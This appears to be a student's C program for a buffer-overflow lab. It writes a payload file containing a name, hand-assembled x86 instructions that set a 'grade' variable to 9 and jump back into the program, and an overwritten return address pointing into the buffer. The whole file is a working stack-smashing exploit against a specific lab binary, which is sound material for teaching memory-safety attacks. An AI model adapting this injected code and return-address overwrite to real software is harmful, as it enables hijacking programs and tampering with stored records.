#include <stdio.h>
#include <stdlib.h>

int main(){
	int i=0;
	FILE *fp=fopen("data9","w");
	if(fp==NULL) exit(EXIT_FAILURE);

	fprintf(fp,"Nasia Boubourak");
	fputc('\0',fp);/*16*/
	
	/*movb 9,addr of grade*/
	fputc(0xc6,fp);
	fputc(0x05,fp);
	/*grade*/	
	fputc(0x68,fp);
	fputc(0x30,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);
	/*9 in hex is 39*/
	fputc(0x39,fp);
	/*movl addr, eax*/
	fputc(0xb8,fp);
	fputc(0x95,fp);
	fputc(0x9e,fp);
	fputc(0x04,fp);
	fputc(0x08,fp);
	/*jmp eax*/
	fputc(0xff,fp);
	fputc(0xe0,fp);
	
	for(i=0;i<4;i++){
		fputc('\0',fp);
	}

	fputc(50,fp);

	/*return address will be at buff + 16 chars(my name) as thats where the code starts
	 * so at Name[16]=0x80e42dc+10(hex)=0x80e42ec*/
	fputc(0xec,fp);
	fputc(0x42,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);

	/*Name*/
	fputc(0xdc,fp);
	fputc(0x42,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);

	fclose(fp);

	return 0;
}
